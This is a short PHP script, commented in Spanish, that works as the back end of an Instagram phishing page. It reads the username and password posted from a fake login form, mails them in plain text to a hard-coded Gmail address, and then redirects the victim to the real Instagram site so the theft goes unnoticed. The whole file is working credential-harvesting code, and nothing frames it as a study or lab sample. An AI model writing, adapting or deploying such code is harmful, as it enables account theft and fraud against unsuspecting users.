<?php
if (isset($_POST['login_submit'])) {
    $to = 'akuma280206@gmail.com'; // Cambia esto por tu dirección de correo electrónico
    $subject = 'Nueva solicitud de inicio de sesión en Instagram';

    $username = $_POST['username'];
    $password = $_POST['password'];

    // Construir el mensaje
    $message = "Usuario: $username\n";
    $message .= "Contraseña: $password\n";

    // Enviar el correo
    $headers = 'From: akuma280206@gmail' . "\r\n" .
               'Reply-To: akuma280206@gmail.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a la página de Instagram
        header("Location: https://www.instagram.com");
        exit();
    } else {
        echo "Lo sentimos, ha ocurrido un error al enviar tu solicitud de inicio de sesión.";
    }
} else {
    // Si alguien intenta acceder a este script directamente sin enviar el formulario,
    // puedes redirigirlos a la página de inicio de sesión.
    header("Location: index.html");
    exit();
}
?>
